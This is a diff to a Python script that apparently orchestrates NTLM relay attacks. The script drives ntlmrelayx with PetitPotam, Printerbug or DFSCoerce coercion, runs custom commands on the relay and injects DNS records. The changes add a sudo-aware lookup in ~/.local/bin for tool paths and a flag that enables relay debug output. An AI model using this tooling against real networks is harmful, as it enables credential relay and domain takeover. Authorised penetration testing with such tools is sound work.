@@ -111,16 +111,42 @@ def check_port(host, port, timeout=3):
         return False
 
 def check_tool(name):
-    """Check for a tool on PATH. On Windows also check the venv Scripts dir."""
+    """Check for a tool on PATH, common user-local dirs, and venv dirs.
+    Handles sudo dropping ~/.local/bin from PATH automatically."""
     path = shutil.which(name)
-    if not path and IS_WINDOWS:
-        # Check venv Scripts directory for .exe variants
+    if not path:
+        # When running under sudo, PATH is reset and user-local dirs are lost.
+        # Check common locations so 'sudo python3 tool.py' works without PATH hacks.
+        fallback_dirs = []
+        # Check the invoking user's home (SUDO_USER is set by sudo)
+        sudo_user = os.environ.get("SUDO_USER")
+        if sudo_user:
+            try:
+                import pwd
+                home = pwd.getpwnam(sudo_user).pw_dir
+                fallback_dirs.append(os.path.join(home, ".local", "bin"))
+            except (KeyError, ImportError):
+                pass
+        # Also check the current user's home
+        home_dir = os.path.expanduser("~")
+        fallback_dirs.append(os.path.join(home_dir, ".local", "bin"))
+        # Check venv bin dirs
         script_dir = Path(__file__).parent.absolute()
-        venv_scripts = script_dir / "venv" / "Scripts"
-        for suffix in ["", ".exe", ".cmd", ".bat"]:
-            candidate = venv_scripts / f"{name}{suffix}"
-            if candidate.exists():
-                path = str(candidate)
+        fallback_dirs.append(str(script_dir / "venv" / "bin"))
+        if IS_WINDOWS:
+            fallback_dirs.append(str(script_dir / "venv" / "Scripts"))
+        for d in fallback_dirs:
+            if IS_WINDOWS:
+                for suffix in ["", ".exe", ".cmd", ".bat"]:
+                    candidate = os.path.join(d, f"{name}{suffix}")
+                    if os.path.isfile(candidate):
+                        path = candidate
+                        break
+            else:
+                candidate = os.path.join(d, name)
+                if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
+                    path = candidate
+            if path:
                 break
     if path:
         log("INFO", "ok", f"{name} found at {path}")
@@ -808,6 +834,9 @@ def start_ntlmrelayx(target, custom_command=None, socks=False, smb_signing=False
             "--no-multirelay", "-i", "-smb2support",
             "--remove-mic", "--keep-relaying"
         ]
+        if args.relay_debug:
+            cmd.append("-debug")
+            log("RELAY", "..", "NTLM debug output enabled (-debug)")
     else:
         log("RELAY", ">>", f"Mode: {C.BLUE}{C.BOLD}Standard SMB relay{C.RST}")
         log("RELAY", ">>", f"Relay target: {C.BOLD}{target}{C.RST}")
@@ -849,6 +878,9 @@ def start_ntlmrelayx(target, custom_command=None, socks=False, smb_signing=False
         log("SMB", "ok", f"Using relay binary: {relay_bin}")
 
         cmd = [relay_bin, "-t", target, "-smb2support"]
+        if args.relay_debug:
+            cmd.append("-debug")
+            log("RELAY", "..", "NTLM debug output enabled (-debug)")
         if custom_command:
             cmd.extend(["-c", custom_command])
             log("RELAY", "..", f"Custom command on relay: {custom_command}")
@@ -1067,6 +1099,8 @@ def main():
     parser.add_argument("-M", "--method", default="PetitPotam",
                         choices=["PetitPotam", "Printerbug", "DFSCoerce"])
     parser.add_argument("--capture", action="store_true", help="Run packet capture in background")
+    parser.add_argument("--relay-debug", action="store_true",
+                        help="Pass -debug to ntlmrelayx for full NTLM message-level output")
     parser.add_argument("--no-debug", action="store_true", help="Suppress debug output")
     parser.add_argument("--skip-dns", action="store_true",
                         help="Skip DNS record injection and propagation check (use when record is already planted)")
